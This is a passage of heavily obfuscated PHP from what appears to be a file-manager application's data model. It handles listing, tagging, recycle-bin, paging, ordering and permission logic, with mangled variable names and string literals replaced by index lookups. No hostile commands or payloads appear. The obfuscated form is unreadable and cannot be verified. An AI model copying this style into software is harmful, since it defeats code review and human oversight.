$™Ú·Èæ[402]); foreach ($”ëŒ¡©ë as &$¨×Ş½ø) { $¨×Ş½ø = array($™Ú·Èæ[419] => $¨×Ş½ø[$™Ú·Èæ[399]], $™Ú·Èæ[420] => $¨×Ş½ø[$™Ú·Èæ[32]], $™Ú·Èæ[421] => $¨×Ş½ø[$™Ú·Èæ[84]], $™Ú·Èæ[422] => $¨×Ş½ø[$™Ú·Èæ[33]], $™Ú·Èæ[423] => $¨×Ş½ø[$™Ú·Èæ[200]], $™Ú·Èæ[424] => $¨×Ş½ø[$™Ú·Èæ[85]]); if ($¨×Ş½ø[$™Ú·Èæ[33]] == $™Ú·Èæ[416] && $‘ÂÃúÒ[$¨×Ş½ø[$™Ú·Èæ[84]]]) { $¨×Ş½ø[$™Ú·Èæ[86]] = $‘ÂÃúÒ[$¨×Ş½ø[$™Ú·Èæ[84]]]; } } unset($¨×Ş½ø); return $”ëŒ¡©ë; } public function listUserTag($æ±ñ¹®) { $²ÏÃòº¿ =& $_SERVER[ĞÂ¤àÓï]; if ($æ±ñ¹® && !is_array($æ±ñ¹®)) { $æ±ñ¹® = array($æ±ñ¹®); } $‹Á¤æé· = Model($²ÏÃòº¿[425])->listData(); $ùËÏ¹áÄ = array(); $Øæ»¥ÀÉ = array(); foreach ($‹Á¤æé· as $ÎäĞÜÆú) { $ìŒ‡’´Š = $ÎäĞÜÆú[$²ÏÃòº¿[84]]; if (!$ìŒ‡’´Š) { continue; } if (!isset($Øæ»¥ÀÉ[$ìŒ‡’´Š])) { $Øæ»¥ÀÉ[$ìŒ‡’´Š] = array(); } $Øæ»¥ÀÉ[$ìŒ‡’´Š][] = $ÎäĞÜÆú[$²ÏÃòº¿[426]]; $ùËÏ¹áÄ[$ÎäĞÜÆú[$²ÏÃòº¿[84]]] = $ÎäĞÜÆú; } $£õ„”Ê = array(); $»Š¸ËÆÍ = array(); $œ½»©Ó = array(); foreach ($Øæ»¥ÀÉ as $Ø›¯ÜÂø => $À˜€™”) { $Õå¸—·Ã = !0; if (!$æ±ñ¹®) { $£õ„”Ê[] = $Ø›¯ÜÂø; continue; } foreach ($æ±ñ¹® as $¹ûü™ã«) { if (!in_array($¹ûü™ã«, $À˜€™”)) { $Õå¸—·Ã = !1; break; } } if (!$Õå¸—·Ã) { continue; } if (!is_numeric($Ø›¯ÜÂø)) { $®©ªÃÔ = $ùËÏ¹áÄ[$Ø›¯ÜÂø]; $âÛõçµå = array($²ÏÃòº¿[32] => $®©ªÃÔ[$²ÏÃòº¿[32]], $²ÏÃòº¿[84] => $®©ªÃÔ[$²ÏÃòº¿[84]], $²ÏÃòº¿[33] => $®©ªÃÔ[$²ÏÃòº¿[33]], $²ÏÃòº¿[86] => array($²ÏÃòº¿[427] => 1), $²ÏÃòº¿[201] => !0); if ($®©ªÃÔ[$²ÏÃòº¿[33]] == $²ÏÃòº¿[199]) { $œ½»©Ó[] = $âÛõçµå; } if ($®©ªÃÔ[$²ÏÃòº¿[33]] == $²ÏÃòº¿[75]) { $»Š¸ËÆÍ[] = $âÛõçµå; } continue; } $£õ„”Ê[] = $Ø›¯ÜÂø; } if ($£õ„”Ê) { $¡Ø•‘Ş = $this->listSource(array($²ÏÃòº¿[417] => array($²ÏÃòº¿[418], $£õ„”Ê))); } $¡Ø•‘Ş = $¡Ø•‘Ş ? $¡Ø•‘Ş : array($²ÏÃòº¿[82] => array(), $²ÏÃòº¿[83] => array()); $¡Ø•‘Ş[$²ÏÃòº¿[82]] = array_merge($¡Ø•‘Ş[$²ÏÃòº¿[82]], $»Š¸ËÆÍ); $¡Ø•‘Ş[$²ÏÃòº¿[83]] = array_merge($¡Ø•‘Ş[$²ÏÃòº¿[83]], $œ½»©Ó); if (isset($¡Ø•‘Ş[$²ÏÃòº¿[366]]) && count($£õ„”Ê) == $¡Ø•‘Ş[$²ÏÃòº¿[366]][$²ÏÃòº¿[367]]) { return $¡Ø•‘Ş; } $¤§µ™Û® = array(); $¼½À®Ÿó = array_to_keyvalue($¡Ø•‘Ş[$²ÏÃòº¿[82]], $²ÏÃòº¿[12], $²ÏÃòº¿[402]); $çíÄâ‡£ = array_to_keyvalue($¡Ø•‘Ş[$²ÏÃòº¿[83]], $²ÏÃòº¿[12], $²ÏÃòº¿[402]); $±¤Õ¯·ü = array_merge($çíÄâ‡£, $¼½À®Ÿó); foreach ($£õ„”Ê as $ìŒ‡’´Š) { if (!in_array($ìŒ‡’´Š, $±¤Õ¯·ü)) { $¤§µ™Û®[] = $ìŒ‡’´Š; } } if ($¤§µ™Û®) { Model($²ÏÃòº¿[428])->removeBySource($¤§µ™Û®); } return $¡Ø•‘Ş; } public function listUserRecycle() { $çÖÛÃ Ú =& $_SERVER[ĞÂ¤àÓï]; $ÈèÎ¿€¬ = Model($çÖÛÃ Ú[429])->listData(); if (!$ÈèÎ¿€¬) { return array(); } $öØû‚Ã« = array($çÖÛÃ Ú[417] => array($çÖÛÃ Ú[418], $ÈèÎ¿€¬), $çÖÛÃ Ú[430] => 1); return $this->listSource($öØû‚Ã«); } public function listSource($¡ÒÒç¼, $ÒæÂóÍÁ = 3000, $“‡…í³¿ = false) { $×¦ûÂé£ =& $_SERVER[ĞÂ¤àÓï]; if (!isset($¡ÒÒç¼[$×¦ûÂé£[431]])) { $¡ÒÒç¼[$×¦ûÂé£[431]] = 0; } if (isset($¡ÒÒç¼[$×¦ûÂé£[432]]) && $¡ÒÒç¼[$×¦ûÂé£[432]] == $×¦ûÂé£[197]) { $¡ÒÒç¼[$×¦ûÂé£[412]] = array($×¦ûÂé£[331], $×¦ûÂé£[433]); } $ç‹¬¬Ó = $×¦ûÂé£[434]; $ğÔ•Ø½Ÿ = $this->field($ç‹¬¬Ó)->_makeOrder()->where($¡ÒÒç¼)->selectPage($ÒæÂóÍÁ); $this->_listPageCheck($ğÔ•Ø½Ÿ, $ç‹¬¬Ó, $¡ÒÒç¼); $this->_listDataApply($ğÔ•Ø½Ÿ[$×¦ûÂé£[369]], $“‡…í³¿); $this->_listMake($ğÔ•Ø½Ÿ); return $ğÔ•Ø½Ÿ; } private function _listPageCheck(&$ªøÕÎë, $á˜³êÑ¼, $šÅ¯•™) { $·²Åç¸® =& $_SERVER[ĞÂ¤àÓï]; if (!is_array($ªøÕÎë[$·²Åç¸®[366]])) { return; } $¥êÉ‡ŞÔ = $ªøÕÎë[$·²Åç¸®[366]]; if ($¥êÉ‡ŞÔ[$·²Åç¸®[368]] <= 1) { return; } if ($¥êÉ‡ŞÔ[$·²Åç¸®[367]] >= 100000) { return; } if (Model($·²Åç¸®[435])->get($·²Åç¸®[436]) != $·²Åç¸®[437]) { return; } $á˜³êÑ¼ = str_replace(array($·²Åç¸®[53], $·²Åç¸®[342], $·²Åç¸®[231]), $·²Åç¸®[12], $á˜³êÑ¼); $á˜³êÑ¼ = $·²Åç¸®[438] . str_replace($·²Åç¸®[50], $·²Åç¸®[439], $á˜³êÑ¼) . $·²Åç¸®[440]; $‰…†›²ƒ = $·²Åç¸®[441]; $‰…†›²ƒ = $‰…†›²ƒ . $·²Åç¸®[442]; $‚Šº÷ßÛ = $¥êÉ‡ŞÔ[$·²Åç¸®[363]] * ($¥êÉ‡ŞÔ[$·²Åç¸®[353]] - 1) . $·²Åç¸®[50] . $¥êÉ‡ŞÔ[$·²Åç¸®[363]]; $Ú¢Ç¯Ã = $this->_makeOrder(!0); $Ç£Ïåµ– = $·²Åç¸®[438] . str_replace($·²Åç¸®[50], $·²Åç¸®[439], $Ú¢Ç¯Ã[0]); if (strpos($Ç£Ïåµ–, $·²Åç¸®[443])) { $Ç£Ïåµ– = str_replace($·²Åç¸®[443], $·²Åç¸®[444], $Ç£Ïåµ–); } else { $Ç£Ïåµ– .= $·²Åç¸®[445] . $Ú¢Ç¯Ã[1]; } $™…‚²·Ë = array(); foreach ($šÅ¯•™ as $è† ·óÆ => $óÏ”îú) { $™…‚²·Ë[$·²Åç¸®[438] . $è† ·óÆ] = $óÏ”îú; } $this->alias($·²Åç¸®[446])->field($á˜³êÑ¼)->limit($‚Šº÷ßÛ)->order($Ç£Ïåµ–); $ÔãÁ­Ï = $this->join($‰…†›²ƒ)->where($™…‚²·Ë)->select(); if ($ÔãÁ­Ï) { $ªøÕÎë[$·²Åç¸®[369]] = $ÔãÁ­Ï; } } protected function _makeOrder($âÂ„ıßÄ = false) { $˜ª„Š× =& $_SERVER[ĞÂ¤àÓï]; $Ôº†Ù£„ = Model($˜ª„Š×[447])->get($˜ª„Š×[448]); $‡Àü­­ñ = Model($˜ª„Š×[447])->get($˜ª„Š×[449]); $êÊôÚ„¢ = array($˜ª„Š×[450] => $˜ª„Š×[451], $˜ª„Š×[452] => $˜ª„Š×[453]); $òªŒŸ½± = array($˜ª„Š×[32] => $˜ª„Š×[32], $˜ª„Š×[76] => $˜ª„Š×[76], $˜ª„Š×[174] => $˜ª„Š×[412], $˜ª„Š×[454] => $˜ª„Š×[454], $˜ª„Š×[455] => $˜ª„Š×[456], $˜ª„Š×[200] => $˜ª„Š×[200], $˜ª„Š×[85] => $˜ª„Š×[85]); $¹º’Óšï = Input::get($˜ª„Š×[457], $˜ª„Š×[7], $Ôº†Ù£„, array_keys($òªŒŸ½±)); $ì³™´£ü = Input::get($˜ª„Š×[458], $˜ª„Š×[7], $‡Àü­­ñ, array_keys($êÊôÚ„¢)); if (!in_array($¹º’Óšï, array_keys($òªŒŸ½±))) { $¹º’Óšï = $˜ª„Š×[32]; } if (!in_array($ì³™´£ü, array_keys($êÊôÚ„¢))) { $¹º’Óšï = $˜ª„Š×[450]; } if ($¹º’Óšï == $˜ª„Š×[32]) { } $¨‡š…¦² = $˜ª„Š×[459] . $òªŒŸ½±[$¹º’Óšï] . $˜ª„Š×[53] . $êÊôÚ„¢[$ì³™´£ü]; $¨‡š…¦² = rtrim(trim($¨‡š…¦²), $˜ª„Š×[50]); if ($âÂ„ıßÄ) { return array($¨‡š…¦², $êÊôÚ„¢[$ì³™´£ü]); } return $this->order($¨‡š…¦²); } protected function _listDataApplyItem($Œ½´Æ, $¥ûš‹‰ä = false) { $²Ù†Îò = array($Œ½´Æ); $this->_listDataApply($²Ù†Îò, $¥ûš‹‰ä); return $²Ù†Îò[0]; } protected function _listDataApply(&$¾ÈÈÀµ•, $®µ¡Ô™ = false) { $‹ÙàğÀ˜ =& $_SERVER[ĞÂ¤àÓï]; if (!$¾ÈÈÀµ•) { $¾ÈÈÀµ• = array(); return; } $«ÀÇ¬¢Ö = array_to_keyvalue($¾ÈÈÀµ•, $‹ÙàğÀ˜[12], $‹ÙàğÀ˜[402]); $«ÀÇ¬¢Ö = array_unique($«ÀÇ¬¢Ö); $this->_listSourceCache($¾ÈÈÀµ•); if (!$®µ¡Ô™) { $this->_listAppendMeta($¾ÈÈÀµ•, $«ÀÇ¬¢Ö); $this->_listAppendFileMeta($¾ÈÈÀµ•, $«ÀÇ¬¢Ö); $this->_listAppendChildren($¾ÈÈÀµ•, $«ÀÇ¬¢Ö); } $this->_listAppendPath($¾ÈÈÀµ•); $this->_listAppendAuth($¾ÈÈÀµ•); $this->_listAppendSourceInfo($¾ÈÈÀµ•, $«ÀÇ¬¢Ö); $this->_listAppendUser($¾ÈÈÀµ•); $this->_listFilterInfo($¾ÈÈÀµ•, $®µ¡Ô™); $this->_listAppendAuthSecret($¾ÈÈÀµ•); } protected function _listSourceCache($ ß°ì¶‡) { $šÁ¨– =& $_SERVER[ĞÂ¤àÓï]; foreach ($ ß°ì¶‡ as $¤õşÊÙ†) { self::$cacheSourceInfo[$šÁ¨–[460] . $¤õşÊÙ†[$šÁ¨–[402]]] = $¤õşÊÙ†; } } protected function _listFilterInfo(&$˜¨ğö¤µ, $Œ¿ßË¨ú = false) { $õÜ«é¯Ë =& $_SERVER[ĞÂ¤àÓï]; foreach ($˜¨ğö¤µ as &$±Ë«‹ç±) { $±Ë«‹ç± = $this->pathInfoFilter($±Ë«‹ç±); self::$cachePathInfo[$õÜ«é¯Ë[461] . intval($Œ¿ßË¨ú) . $õÜ«é¯Ë[386] . $±Ë«‹ç±[$õÜ«é¯Ë[402]]] = $±Ë«‹ç±; } unset($±Ë«‹ç±); } protected function _listMake(&$¯Á…«şÄ) { $ Ö·ıù­ =& $_SERVER[ĞÂ¤àÓï]; $¯Á…«şÄ[$ Ö·ıù­[82]] = array(); $¯Á…«şÄ[$ Ö·ıù­[83]] = array(); foreach ($¯Á…«şÄ[$ Ö·ıù­[369]] as $âòã†Ìì) { $Ğ¼òúåè = $âòã†Ìì[$ Ö·ıù­[410]] == 1 ? $ Ö·ıù­[82] : $ Ö·ıù­[83]; $¯Á…«şÄ[$Ğ¼òúåè][] = $âòã†Ìì; } unset($¯Á…«şÄ[$ Ö·ıù­[369]]); } protected function _listAppendMeta(&$Ê¯Â¸ôö, $„êò§ïö) { $¢«ú†ãİ =& $_SERVER[ĞÂ¤àÓï]; $ºÚ•ô˜˜ = array($¢«ú†ãİ[417] => array($¢«ú†ãİ[418], $„êò§ïö)); $§Ÿş‡ü = Model($¢«ú†ãİ[462])->field($¢«ú†ãİ[463])->where($ºÚ•ô˜˜)->select(); if (!$§Ÿş‡ü) { return; } $²·–»– = array($¢«ú†ãİ[464], $¢«ú†ãİ[465], $¢«ú†ãİ[444]); $Â½›°ñ = array(); foreach ($§Ÿş‡ü as $•®Û–©) { if (!isset($Â½›°ñ[$•®Û–©[$¢«ú†ãİ[402]]])) { $Â½›°ñ[$•®Û–©[$¢«ú†ãİ[402]]] = array(); } if (in_array($•®Û–©[$¢«ú†ãİ[94]], $²·–»–)) { continue; } $Â½›°ñ[$•®Û–©[$¢«ú†ãİ[402]]][$•®Û–©[$¢«ú†ãİ[94]]] = $•®Û–©[$¢«ú†ãİ[374]]; } foreach ($Ê¯Â¸ôö as &$¾ïÖÅúÛ) { $¾ïÖÅúÛ[$¢«ú†ãİ[466]] = !1; if (isset($Â½›°ñ[$¾ïÖÅúÛ[$¢«ú†ãİ[402]]])) { $¾ïÖÅúÛ[$¢«ú†ãİ[466]] = $Â½›°ñ[$¾ïÖÅúÛ[$¢«ú†ãİ[402]]]; } if ($this->fileIsLock($¾ïÖÅúÛ) && $¾ïÖÅúÛ[$¢«ú†ãİ[413]]) { $ŞÂæûØˆ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¾ïÖÅúÛ[$¢«ú†ãİ[413]][$¢«ú†ãİ[414]] = AuthModel::authDisable($¾ïÖÅúÛ[$¢«ú†ãİ[413]][$¢«ú†ãİ[414]], $ŞÂæûØˆ); $¾ïÖÅúÛ[$¢«ú†ãİ[413]][$¢«ú†ãİ[467]][$¢«ú†ãİ[413]] = $¾ïÖÅúÛ[$¢«ú†ãİ[413]][$¢«ú†ãİ[414]]; } } unset($¾ïÖÅúÛ); } protected function _listAppendFileMeta(&$­€»¼ÑÌ, $Äİ¿‘‡é) { $ù‚½±ŞÎ =& $_SERVER[ĞÂ¤àÓï]; $éÅ· ‹ƒ = array_to_keyvalue($­€»¼ÑÌ, $ù‚½±ŞÎ[12], $ù‚½±ŞÎ[468]); $éÅ· ‹ƒ = array_filter(array_unique($éÅ· ‹ƒ)); if (!$éÅ· ‹ƒ) { return; } $˜†˜û˜¢ = array($ù‚½±ŞÎ[469] => array($ù‚½±ŞÎ[418], $éÅ· ‹ƒ)); $«—¬ì = $ù‚½±ŞÎ[470]; $à¥–Øû‘ = Model($ù‚½±ŞÎ[471])->field($«—¬ì)->where($˜†˜û˜¢)->select(); $à¥–Øû‘ = array_to_keyvalue($à¥–Øû‘, $ù‚½±ŞÎ[468]); $Èœİ‰À = Model($ù‚½±ŞÎ[472])->field($ù‚½±ŞÎ[473])->where($˜†˜û˜¢)->select(); $Èœİ‰À = $Èœİ‰À ? $Èœİ‰À : array(); $çãøûßË = array(); foreach ($Èœİ‰À as $áˆ¯®) { if (!isset($çãøûßË[$áˆ¯®[$ù‚½±ŞÎ[468]]])) { $çãøûßË[$áˆ¯®[$ù‚½±ŞÎ[468]]] = array(); } $çãøûßË[$áˆ¯®[$ù‚½±ŞÎ[468]]][$áˆ¯®[$ù‚½±ŞÎ[94]]] = $áˆ¯®[$ù‚½±ŞÎ[374]]; } foreach ($­€»¼ÑÌ as &$ò€É¯) { $Ç‰À’‘ = $ò€É¯[$ù‚½±ŞÎ[468]]; if (!$Ç‰À’‘ || !is_array($à¥–Øû‘[$Ç‰À’‘])) { continue; } $Îå•ÕÙ® = $à¥–Øû‘[$Ç‰À’‘]; $Îå•ÕÙ®[$ù‚½±ŞÎ[76]] = $ò€É¯[$ù‚½±ŞÎ[76]]; $Îå•ÕÙ®[$ù‚½±ŞÎ[32]] = $ò€É¯[$ù‚½±ŞÎ[32]]; if (!isset(self::$cacheFileInfo[$ù‚½±ŞÎ[474] . $Ç‰À’‘])) { self::$cacheFileInfo[$ù‚½±ŞÎ[474] . $Ç‰À’‘] = array_merge(array(), $Îå•ÕÙ®); } unset($à¥–Øû‘[$Ç‰À’‘][$ù‚½±ŞÎ[84]]); $ÈöãÍë = is_array($çãøûßË[$Ç‰À’‘]) ? $çãøûßË[$Ç‰À’‘] : array(); $ò€É¯[$ù‚½±ŞÎ[170]] = array_merge($ÈöãÍë, $à¥–Øû‘[$Ç‰À’‘]); if (isset($ò€É¯[$ù‚½±ŞÎ[170]][$ù‚½±ŞÎ[169]])) { $ò€É¯[$ù‚½±ŞÎ[169]] = json_decode($ò€É¯[$ù‚½±ŞÎ[170]][$ù‚½±ŞÎ[169]], !0); unset($ò€É¯[$ù‚½±ŞÎ[170]][$ù‚½±ŞÎ[169]]); } } unset($ò€É¯); } protected function _listAppendSourceInfo(&$ªÓÛüÕ, $•Ş‚¸à ) { $Ùã’ÀÈ =& $_SERVER[ĞÂ¤àÓï]; if (!defined($Ùã’ÀÈ[475])) { return; } $İåÔĞŠ™ = Model($Ùã’ÀÈ[476])->listData(); $»€Åáò— = Model($Ùã’ÀÈ[425])->listData(); $”ô¹şœ’ = Model($Ùã’ÀÈ[415])->listData(); $Î‰‹ğè = Model($Ùã’ÀÈ[477])->listSimple(); $ªØíĞ…Î = array_to_keyvalue($İåÔĞŠ™, $Ùã’ÀÈ[399]); $¥îºûÑ = array_to_keyvalue_group($»€Åáò—, $Ùã’ÀÈ[84], $Ùã’ÀÈ[426]); $è¿µ¸ = array_to_keyvalue($”ô¹şœ’, $Ùã’ÀÈ[84]); $•Ç«Í ¸ = array_to_keyvalue_group($Î‰‹ğè, $Ùã’ÀÈ[402]); foreach ($ªÓÛüÕ as &$ »š‡Í) { $ »š‡Í[$Ùã’ÀÈ[86]] = array($Ùã’ÀÈ[478] => 0, $Ùã’ÀÈ[479] => 0, $Ùã’ÀÈ[480] => 0); if (isset($è¿µ¸[$ »š‡Í[$Ùã’ÀÈ[402]]])) { $ »š‡Í[$Ùã’ÀÈ[86]][$Ùã’ÀÈ[481]] = 1; $ »š‡Í[$Ùã’ÀÈ[86]][$Ùã’ÀÈ[482]] = $è¿µ¸[$ »š‡Í[$Ùã’ÀÈ[402]]][$Ùã’ÀÈ[32]]; } if ($¥îºûÑ && $ªØíĞ…Î && isset($¥îºûÑ[$ »š‡Í[$Ùã’ÀÈ[402]]])) { $ »š‡Í[$Ùã’ÀÈ[86]][$Ùã’ÀÈ[483]] = array(); foreach ($¥îºûÑ[$ »š‡Í[$Ùã’ÀÈ[402]]] as $Óª„Ç¹Ù) { $îö©êç = $ªØíĞ…Î[$Óª„Ç¹Ù]; $ »š‡Í[$Ùã’ÀÈ[86]][$Ùã’ÀÈ[483]][] = array($Ùã’ÀÈ[484] => $îö©êç[$Ùã’ÀÈ[399]], $Ùã’ÀÈ[420] => $îö©êç[$Ùã’ÀÈ[32]], $Ùã’ÀÈ[485] => $îö©êç[$Ùã’ÀÈ[486]]); } } if ($•Ç«Í ¸ && isset($•Ç«Í ¸[$ »š‡Í[$Ùã’ÀÈ[402]]])) { $ »š‡Í[$Ùã’ÀÈ[86]][$Ùã’ÀÈ[487]] = array(); foreach ($•Ç«Í ¸[$ »š‡Í[$Ùã’ÀÈ[402]]] as $÷Ã¼Ø©) { $ »š‡Í[$Ùã’ÀÈ[86]][$Ùã’ÀÈ[487]] = array($Ùã’ÀÈ[488] => $÷Ã¼Ø©[$Ùã’ÀÈ[489]], $Ùã’ÀÈ[490] => $÷Ã¼Ø©[$Ùã’ÀÈ[491]], $Ùã’ÀÈ[492] => $÷Ã¼Ø©[$Ùã’ÀÈ[402]], $Ùã’ÀÈ[493] => $÷Ã¼Ø©[$Ùã’ÀÈ[494]], $Ùã’ÀÈ[495] => $÷Ã¼Ø©[$Ùã’ÀÈ[496]], $Ùã’ÀÈ[497] => $÷Ã¼Ø©[$Ùã’ÀÈ[497]], $Ùã’ÀÈ[498] => $÷Ã¼Ø©[$Ùã’ÀÈ[498]]); } } } unset($ »š‡Í); return $ªÓÛüÕ; } protected function _listAppendChildren(&$×ºÒ€Ì, $ò€­”ñ™) { $Æå·‡äÒ =& $_SERVER[ĞÂ¤àÓï]; $…·äŒûó = array(); $ÎŞšë¨’ = array($Æå·‡äÒ[207] => 0, $Æå·‡äÒ[208] => 0); foreach ($×ºÒ€Ì as &$èá–ÙŸ) { if (!$èá–ÙŸ[$Æå·‡äÒ[410]]) { continue; } $…·äŒûó[] = $èá–ÙŸ[$Æå·‡äÒ[402]]; } unset($èá–ÙŸ); if (!$…·äŒûó) { return; } $×Å¡Ú† = array($Æå·‡äÒ[432] => array($Æå·‡äÒ[7], $…·äŒûó), $Æå·‡äÒ[431] => 0); $¹›îœé¾ = array($Æå·‡äÒ[432], $Æå·‡äÒ[410], $Æå·‡äÒ[499] => $Æå·‡äÒ[500]); $Äı×´ùï = $this->field($¹›îœé¾)->where($×Å¡Ú†)->group($Æå·‡äÒ[501])->select(); $”·–ã = array(); foreach ($Äı×´ùï as $ª“¦è£Ğ) { $ÚğÈ‰Á„ = $ª“¦è£Ğ[$Æå·‡äÒ[432]]; $ÖÖÍ†ª = $ª“¦è£Ğ[$Æå·‡äÒ[410]] == $Æå·‡äÒ[88] ? $Æå·‡äÒ[208] : $Æå·‡äÒ[207]; if (!isset($”·–ã[$ÚğÈ‰Á„])) { $”·–ã[$ÚğÈ‰Á„] = array($Æå·‡äÒ[207] => 0, $Æå·‡äÒ[208] => 0); } $”·–ã[$ÚğÈ‰Á„][$ÖÖÍ†ª] += $ª“¦è£Ğ[$Æå·‡äÒ[500]]; } foreach ($×ºÒ€Ì as &$èá–ÙŸ) { if (!$èá–ÙŸ[$Æå·‡äÒ[410]]) { continue; } $ø¶öšğ = is_array($”·–ã[$èá–ÙŸ[$Æå·‡äÒ[402]]]) ? $”·–ã[$èá–ÙŸ[$Æå·‡äÒ[402]]] : $ÎŞšë¨’; $èá–ÙŸ[$Æå·‡äÒ[208]] = $ø¶öšğ[$Æå·‡äÒ[208]]; $èá–ÙŸ[$Æå·‡äÒ[207]] = $ø¶öšğ[$Æå·‡äÒ[207]]; unset($èá–ÙŸ[$Æå·‡äÒ[412]]); } unset($èá–ÙŸ); } protected function _listAppendAuth(&$Ù’²”è¿) { $ûŠ•ª‚£ =& $_SERVER[ĞÂ¤àÓï]; if (!defined($ûŠ•ª‚£[475])) { return; } $ãÎÌÅŞ• = array(); foreach ($Ù’²”è¿ as $€’Õá¹) { if ($€’Õá¹[$ûŠ•ª‚£[411]] == self::TYPE_GROUP) { $ãÎÌÅŞ•[] = $€’Õá¹[$ûŠ•ª‚£[402]]; } } if (!$ãÎÌÅŞ•) { return; } $…ØÏƒ“  = array_to_keyvalue($Ù’²”è¿, $ûŠ•ª‚£[402]); $¼½È•ºº = Model($ûŠ•ª‚£[502])->getSourceList($ãÎÌÅŞ•, $…ØÏƒ“ ); $Éöş„™œ = $GLOBALS[$ûŠ•ª‚£[503]] == 1; foreach ($Ù’²”è¿ as $²®êÓ˜» => &$€’Õá¹) { $€’Õá¹[$ûŠ•ª‚£[413]] = $¼½È•ºº[$€’Õá¹[$ûŠ•ª‚£[402]]]; if (!$€’Õá¹[$ûŠ•ª‚£[413]] && $€’Õá¹[$ûŠ•ª‚£[411]] == self::TYPE_GROUP) { $€’Õá¹[$ûŠ•ª‚£[413]] = Action($ûŠ•ª‚£[504])->pathGroupAuthMake($€’Õá¹[$ûŠ•ª‚£[505]]); if (!$€’Õá¹[$ûŠ•ª‚£[413]] && !$Éöş„™œ) { $€’Õá¹[$ûŠ•ª‚£[202]] = !1; $€’Õá¹[$ûŠ•ª‚£[201]] = !1; } } if ($€’Õá¹[$ûŠ•ª‚£[413]]) { $€’Õá¹[$ûŠ•ª‚£[202]] = AuthModel::authCheckEdit($€’Õá¹[$ûŠ•ª‚£[413]][$ûŠ•ª‚£[414]]); $€’Õá¹[$ûŠ•ª‚£[201]] = AuthModel::authCheckView($€’Õá¹[$ûŠ•ª‚£[413]][$ûŠ•ª‚£[414]]); } $this->groupPathDisplay($€’Õá¹); } unset($€’Õá¹); } public function _listAppendAuthSecret(&$¼ï¬Û’‘) { $œ¼¥³Œõ =& $_SERVER[ĞÂ¤àÓï]; if (Model($œ¼¥³Œõ[435])->get($œ¼¥³Œõ[506]) != $œ¼¥³Œõ[88]) { return; } static $¡ˆç£¯ = false; if (!$¡ˆç£¯) { $µŸøàˆ· = Model($œ¼¥³Œõ[507]); $Â»Í×şı = Model($œ¼¥³Œõ[508]); $¡ˆç£¯ = $Â»Í×şı->listData(); $¡ˆç£¯ = array_to_keyvalue($¡ˆç£¯, $œ¼¥³Œõ[402]); $İÏßˆË’ = json_decode(Model($œ¼¥³Œõ[435])->get($œ¼¥³Œõ[509]), !0); $İÏßˆË’ = array_to_keyvalue($İÏßˆË’, $œ¼¥³Œõ[399]); foreach ($¡ˆç£¯ as $æ¥ÀäùÙ => $ÇõØ‘¡ğ) { $òçòÜİı = $İÏßˆË’[$ÇõØ‘¡ğ[$œ¼¥³Œõ[510]]]; if (!$òçòÜİı) { $Â»Í×şı->remove($ÇõØ‘¡ğ[$œ¼¥³Œõ[399]]); unset($¡ˆç£¯[$æ¥ÀäùÙ]); continue; } $¦Ò‹Ôİª = $µŸøàˆ·->listData($òçòÜİı[$œ¼¥³Œõ[413]]); if (!$¦Ò‹Ôİª) { $Â»Í×şı->remove($ÇõØ‘¡ğ[$œ¼¥³Œõ[399]]); unset($¡ˆç£¯[$æ¥ÀäùÙ]); continue; } $ÇõØ‘¡ğ[$œ¼¥³Œõ[413]] = $¦Ò‹Ôİª; $ÇõØ‘¡ğ[$œ¼¥³Œõ[511]] = $òçòÜİı; $ÇõØ‘¡ğ[$œ¼¥³Œõ[512]] = Model($œ¼¥³Œõ[513])->getInfoSimpleOuter($ÇõØ‘¡ğ[$œ¼¥³Œõ[454]]); $¡ˆç£¯[$æ¥ÀäùÙ] = $ÇõØ‘¡ğ; } } $»…†”©¾ = defined($œ¼¥³Œõ[514]) ? USER_ID : $œ¼¥³Œõ[12]; $„ÈæÒî = array(); $­ø“—œø = $this->_listAppendPath($„ÈæÒî, !0); foreach ($¼ï¬Û’‘ as $æ¥ÀäùÙ => &$ÇõØ‘¡ğ) { if (!is_array($ÇõØ‘¡ğ[$œ¼¥³Œõ[413]])) { continue; } if ($ÇõØ‘¡ğ[$œ¼¥³Œõ[411]] != $œ¼¥³Œõ[515]) { continue; } if (isset($¡ˆç£¯[$ÇõØ‘¡ğ[$œ¼¥³Œõ[402]]])) { $×¼µ = $¡ˆç£¯[$ÇõØ‘¡ğ[$œ¼¥³Œõ[402]]]; if (!is_array($ÇõØ‘¡ğ[$œ¼¥³Œõ[466]])) { $ÇõØ‘¡ğ[$œ¼¥³Œõ[466]] = array(); } $ÇõØ‘¡ğ[$œ¼¥³Œõ[466]][$œ¼¥³Œõ[516]] = $×¼µ[$œ¼¥³Œõ[510]]; $ÇõØ‘¡ğ[$œ¼¥³Œõ[413]][$œ¼¥³Œõ[517]] = $×¼µ; $ÇõØ‘¡ğ[$œ¼¥³Œõ[413]][$œ¼¥³Œõ[518]] = $ÇõØ‘¡ğ[$œ¼¥³Œõ[519]]; $ÇõØ‘¡ğ[$œ¼¥³Œõ[413]][$œ¼¥³Œõ[520]] = $œ¼¥³Œõ[88]; if ($×¼µ[$œ¼¥³Œõ[454]] != $»…†”©¾) { $ÇõØ‘¡ğ[$œ¼¥³Œõ[413]][$œ¼¥³Œõ[414]] = $ÇõØ‘¡ğ[$œ¼¥³Œõ[413]][$œ¼¥³Œõ[414]] & $×¼µ[$œ¼¥³Œõ[413]][$œ¼¥³Œõ[413]]; } continue; } $ÆŞèÆÊ‚ = $this->parentLevelArray($ÇõØ‘¡ğ[$œ¼¥³Œõ[521]]); $‘–Ãİıš = array_reverse($ÆŞèÆÊ‚); foreach ($‘–Ãİıš as $•·ÌÍ¶Š => $¦Ö³ÎÈ) { if (!isset($¡ˆç£¯[$¦Ö³ÎÈ])) { continue; } $×¼µ = $¡ˆç£¯[$¦Ö³ÎÈ]; $ÇõØ‘¡ğ[$œ¼¥³Œõ[413]][$œ¼¥³Œõ[517]] = $×¼µ; if ($×¼µ[$œ¼¥³Œõ[454]] != $»…†”©¾) { $ÇõØ‘¡ğ[$œ¼¥³Œõ[413]][$œ¼¥³Œõ[414]] = $ÇõØ‘¡ğ[$œ¼¥³Œõ[413]][$œ¼¥³Œõ[414]] & $×¼µ[$œ¼¥³Œõ[413]][$œ¼¥³Œõ[413]]; } $ñ—©ÄŞ = $œ¼¥³Œõ[12]; $®¶¸İõÛ = count($ÆŞèÆÊ‚) - $•·ÌÍ¶Š; for ($øäÎçóŞ = 0; $øäÎçóŞ < $®¶¸İõÛ; $øäÎçóŞ++) { if (!isset($­ø“—œø[$ÆŞèÆÊ‚[$øäÎçóŞ]])) { $ñ—©ÄŞ = 